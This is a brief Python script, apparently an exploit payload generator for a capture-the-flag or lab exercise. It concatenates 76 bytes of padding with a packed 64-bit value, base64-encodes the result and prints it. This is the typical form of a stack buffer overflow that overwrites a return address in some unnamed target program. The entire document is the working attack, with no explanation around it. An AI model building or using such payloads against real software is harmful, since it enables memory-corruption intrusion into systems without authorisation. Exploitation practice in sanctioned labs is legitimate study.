
import sys
import struct
import base64

buf = b'hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh'
buf += struct.pack('<Q', 10602735192465297240)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
